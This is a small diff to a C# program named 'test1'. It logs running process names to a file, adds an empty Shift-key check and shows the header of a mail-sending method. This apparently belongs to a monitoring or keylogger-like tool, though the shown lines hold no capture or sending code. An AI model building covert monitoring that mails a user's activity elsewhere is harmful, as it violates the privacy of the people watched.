@@ -6,6 +6,7 @@ using System.Net.Mail;
 using System.Runtime.InteropServices;
 using System.Threading;
 
+
 namespace test1
 {
     class Program
@@ -49,7 +50,8 @@ namespace test1
                                 {
                                     using (StreamWriter sw = File.AppendText(pathProcesses))
                                     {
-                                        sw.WriteLine(FileVersionInfo.GetVersionInfo(p.MainModule.FileName).FileDescription);
+                                        sw.WriteLine(p.ProcessName);
+                                        //sw.WriteLine(FileVersionInfo.GetVersionInfo(p.MainModule.FileName).FileDescription);
                                     }
                                 }
                             }
@@ -57,8 +59,14 @@ namespace test1
                         }
                     }
                 }
+                if (Control.ModifierKeys == Keys.Shift)
+                {
+                    
+                }
             }
         }
+
+    
 
         static void SendNewMessage()
         {
